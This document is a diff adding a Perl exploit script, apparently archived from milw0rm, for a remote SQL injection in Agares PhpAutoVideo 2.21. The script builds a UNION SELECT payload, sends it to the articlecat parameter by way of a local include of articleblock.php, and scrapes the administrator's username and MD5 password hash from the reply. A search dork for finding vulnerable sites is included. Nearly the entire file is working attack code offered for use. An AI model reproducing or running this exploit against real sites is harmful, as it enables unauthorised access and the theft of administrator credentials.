@@ -1,0 +1,54 @@
+#!/usr/bin/perl
+#Agares PhpAutoVideo 2.21 (articlecat) Remote SQL Injection Exploit
+#Bug Found by ka0x ( http://milw0rm.org/exploits/4901 ).. but sql injection works if we include in index.php bug file with sql injection..like this :
+#http://192.168.1.102/video/UPLOAD/index.php?loadpage=./includes/articleblock.php&articlecat=[SQL]
+#So.. we can execute sql query and we have user admin & pass in MD5
+#Exploit by Pr0metheus
+#Gr33tz to Gr33tz-Team.org
+#Dork : "powered by AMCMS3"
+###############################################
+use LWP::UserAgent;
+if(@ARGV!=3){
+	print "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
+	print "Agares PhpAutoVideo 2.21 Remote Sql Injection\n";
+	print "perl $0 <site> <path> <prefix>\n";
+    print "default prefix - amcms\n";
+	print "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
+}
+($site,$path,$prefix)=@ARGV;
+$file  = "index.php?loadpage=./includes/articleblock.php&articlecat=";
+$query = "1+and+1=2+UNION+SELECT+userkey,username,password,4,5,6,7,8,9,10+from+".$prefix."_users+where+userkey=1/*";
+$ua = new LWP::UserAgent;
+$ua->agent("Mozilla/8.0");
+$ua = LWP::UserAgent->new;
+my $req = HTTP::Request->new(GET => "".$site."".$path."".$file."".$query."");
+$req->header('Accept' => 'text/html');
+$res = $ua->request($req);
+$con = $res->content;
+if($con =~ /<p>(.*)<\/p>/){
+	$p = $1;
+	print "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
+	print "Agares PhpAutoVideo 2.21 Remote Sql Injection\n\n";
+	print "[+] Admin Pass : ".$p."\n";
+	
+	if($con =~/">(.*)<\/a><\/h1>/){
+		$u = $1;
+		print "[+] Admin Username : ".$u."\n";
+		print "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
+	
+	}
+	else{
+		print "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
+		print "Agares PhpAutoVideo 2.21 Remote Sql Injection\n\n";
+		print "[+] Exploit Failed...\n";
+		print "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
+	}
+}
+else{
+	print "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
+	print "Agares PhpAutoVideo 2.21 Remote Sql Injection\n\n";
+	print "[+] Exploit Failed...\n";
+	print "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n";
+}
+
+# milw0rm.com [2008-01-13]
